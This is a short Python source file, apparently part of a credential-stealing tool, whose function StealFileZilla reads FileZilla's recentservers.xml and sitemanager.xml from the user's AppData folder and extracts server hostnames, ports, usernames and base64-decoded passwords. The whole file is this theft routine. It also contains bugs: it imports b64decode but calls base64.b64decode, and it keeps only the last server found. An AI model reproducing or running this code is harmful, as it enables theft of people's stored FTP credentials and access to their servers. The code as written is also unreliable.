# Import modules

import os
from xml.dom import minidom
from base64 import b64decode


# Fetch servers from FileZilla

FileZilla = os.getenv('AppData') + '\\FileZilla\\'

def StealFileZilla():
	if not os.path.exists(FileZilla):
		return []

	RecentServersPath = FileZilla + 'recentservers.xml'
	SiteManagerPath = FileZilla + 'sitemanager.xml'

	# Read recent servers

	if os.path.exists(RecentServersPath):
		xmlDoc = minidom.parse(RecentServersPath)
		Servers = xmlDoc.getElementsByTagName('Server')
		for Node in Servers:
			Server = {
				'Hostname': 'ftp://' + Node.getElementsByTagName('Host')[0].firstChild.data + ':' + Node.getElementsByTagName('Port')[0].firstChild.data + '/',
				'Username': Node.getElementsByTagName('User')[0].firstChild.data,
				'Password': base64.b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
			}

	# Read sitemanager

	if os.path.exists(SiteManagerPath):
		xmlDoc = minidom.parse(SiteManagerPath)
		Servers = xmlDoc.getElementsByTagName('Server')
		for Node in Servers:
			Server = {
				'Hostname': 'ftp://' + Node.getElementsByTagName('Host')[0].firstChild.data + ':' + Node.getElementsByTagName('Port')[0].firstChild.data + '/',
				'Username': Node.getElementsByTagName('User')[0].firstChild.data,
				'Password': base64.b64decode(Node.getElementsByTagName('Pass')[0].firstChild.data).decode()
			}

	return Server